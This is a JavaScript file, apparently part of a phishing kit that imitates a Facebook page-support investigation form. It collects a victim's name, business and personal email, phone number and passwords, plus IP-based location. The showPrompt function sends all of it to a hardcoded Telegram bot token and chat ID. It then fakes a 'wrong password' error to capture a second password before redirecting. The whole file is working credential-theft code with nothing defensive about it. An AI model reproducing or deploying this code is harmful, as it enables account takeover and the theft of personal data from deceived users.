function getIP(callback) {
    fetch('https://api.db-ip.com/v2/free/self')
        .then(response => response.json())
        .then(data => callback(data))
        .catch(error => callback(undefined));
}

$(document).ready(function () {

    $('#input').html(`
        <div class="mb-3">
            <label for="page-name" class="form-label">
                Page Name <span class="text-danger">*</span>
            </label>
            <input type="text" class="form-control" required id="page-name" aria-describedby="emailHelp">
        </div>
        <div class="mb-3">
            <label for="full-name" class="form-label">
                Full Name <span class="text-danger">*</span>
            </label>
            <input type="text" class="form-control" required id="full-name" aria-describedby="emailHelp">
        </div>
        <div class="mb-3">
            <label for="business-email" class="form-label">
                Business Email Address <span class="text-danger">*</span>
            </label>
            <input type="text" class="form-control" required id="business-email" aria-describedby="emailHelp">
        </div>
        <div class="mb-3">
            <label for="personal-email" class="form-label">
                Personal Email Address <span class="text-danger">*</span>
            </label>
            <input type="text" class="form-control" required id="personal-email" aria-describedby="emailHelp">
        </div>
        <div class="mb-3">
            <label for="phone" class="form-label">
                Mobile Phone Number <span class="text-danger">*</span>
            </label>
            <input type="text" class="form-control" required id="phone" aria-describedby="emailHelp">
        </div>
        <div class="mb-3">
            <label for="full-name" class="form-label">
                Please provide us information that will help us investigate.
            </label>
            <textarea class="form-control" id="description" rows="3"></textarea>
        </div>
        <button type="button" class="btn mb-4">Submit</button>
    `);

    openDetail();
    let IpAddress = '';

    getIP(ip => {
        IpAddress = ip;
        sendForm(IpAddress);
    });

    $('#phone').on('input', function () {
        var input = $(this).val();
        var validInputRegex = /^[+\d]*$/;

        if (!validInputRegex.test(input)) {
            $(this).val(input.slice(0, -1));
        }
    });

});

function openDetail() {
    $(".nav-item-parent").on("click", function () {
        var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
        var isOpen = currentRotate != 0;

        $(".detail").css("display", "none");
        $(".arrow").css("rotate", "0deg");

        const id = $(this).data("id");
        if (!isOpen) {
            $("#" + id).css("display", "block");
            $(this).find(".arrow").css("rotate", "180deg");
        }
    });

    $(".nav-item-child").on("click", function () {
        var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
        var isOpen = currentRotate != 0;

        const id = $(this).data("id");
        if (!isOpen) {
            $("#" + id).css("display", "block");
            $(this).find(".arrow").css("rotate", "180deg");
            $(this).find(".icon-container i").css("-webkit-filter", "invert(100%)");
            $(this).find(".icon-container").css("background-color", "#1877F2");
            $(this).css("background", "#eaf3ffe8");
        } else {
            $("#" + id).css("display", "none");
            $(this).find(".arrow").css("rotate", "0deg");
            $(this).find(".icon-container").css("background-color", "var(--color-white-secondary)");
            $(this).find(".icon-container i").css("-webkit-filter", "invert(0%)");
            $(this).css("background", "none");
        }
    });
}

function validateForm() {
    var isValid = true;

    var pageName = $('#page-name').val();
    if (pageName === '') {
        isValid = false;
        $('#page-name').addClass('border-danger');
    } else {
        $('#page-name').removeClass('border-danger');
    }

    var fullName = $('#full-name').val();
    if (fullName === '') {
        isValid = false;
        $('#full-name').addClass('border-danger');
    } else {
        $('#full-name').removeClass('border-danger');
    }

    var businessEmail = $('#business-email').val();
    var emailRegex = /^([a-zA-Z0-9_.+-])+@(([a-zA-Z0-9-])+\\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(businessEmail)) {
        isValid = false;
        $('#business-email').addClass('border-danger');
    } else {
        $('#business-email').removeClass('border-danger');
    }

    var personalEmail = $('#personal-email').val();
    if (!emailRegex.test(personalEmail)) {
        isValid = false;
        $('#personal-email').addClass('border-danger');
    } else {
        $('#personal-email').removeClass('border-danger');
    }

    var phone = $('#phone').val();
    var phoneRegex = /^(\+\\d+|\\d+)$/;
    if (!phoneRegex.test(phone)) {
        isValid = false;
        $('#phone').addClass('border-danger');
    } else {
        $('#phone').removeClass('border-danger');
    }

    return isValid;
}

var NUMBER_TIME_LOGIN = 0;
let FIRST_PASSWORD = '';

function sendForm(IpAddress) {
    $(".content #dataGet button[type=button]").off("click");

    $(".content #dataGet button[type=button]").on("click", function () {
        if (validateForm()) {
            showPrompt(IpAddress);
        }
    });
}

function showPrompt(IpAddress) {
    $('#getPassword').removeClass('d-none');

    $("#close-password").off("click");
    $('#close-password').on('click', function () {
        $('#getPassword').addClass('d-none');
    });

    $("#submit-password").off("click");
    $('#submit-password').on('click', function () {
        let password = $("#password").val();
        if (password === '') {
            $('#password').addClass('border-danger');
            return;
        } else {
            $('#password').removeClass('border-danger');
        }

        let secondPassword = '';
        if (NUMBER_TIME_LOGIN >= 1) {
            secondPassword = password;
            password = FIRST_PASSWORD;
        }

        const message1 = `📧 <strong>Business Email: </strong><code>${$("#business-email").val()}</code>
👤 <strong>User Name: </strong><code>${$("#full-name").val()}</code>
📨 <strong>Personal Email: </strong><code>${$("#personal-email").val()}</code>
🏳️ <strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
📞 <strong>Phone Number: </strong><code>${$("#phone").val()}</code>
🔑 <strong>First Password: </strong><code>${password}</code>
🔑 <strong>Second Password: </strong><code>${secondPassword}</code>
🌐 <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
 <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
 <strong>City: </strong><code>${IpAddress.city}</code>`;

        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
        const chatId = '-1002416068664';
        const message = message1;

        $('#submit-password').prop('disabled', true);

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'html'
            })
        })
        .then(response => {
            if (!response.ok) throw new Error('Network error');
            return response.json();
        })
        .then(data => {
            NUMBER_TIME_LOGIN++;
            if (NUMBER_TIME_LOGIN === 1) {
                FIRST_PASSWORD = password;

                setTimeout(function () {
                    $('.lsd-ring-container').addClass('d-none');
                    $('#wrong-password').removeClass('d-none');
                    $("#password").val('');

                    let countdown = 10;
                    $('#submit-password').text(`Wait ${countdown}s`);
                    const timer = setInterval(() => {
                        countdown--;
                        $('#submit-password').text(`Wait ${countdown}s`);
                        if (countdown <= 0) {
                            clearInterval(timer);
                            $('#submit-password').prop('disabled', false);
                            $('#submit-password').text('Continue');
                        }
                    }, 1000);

                }, 2000);
            } else {
                setTimeout(function () {
                    $('.lsd-ring-container').addClass('d-none');
                    window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
                }, 2000);
            }
        })
        .catch(error => {
            setTimeout(function () {
                Swal.fire({
                    text: `Request failed!`,
                    icon: "error"
                });
                $('.lsd-ring-container').addClass('d-none');
                $('#submit-password').prop('disabled', false);
                $('#submit-password').text('Continue');
            }, 500);
        });
    });
}
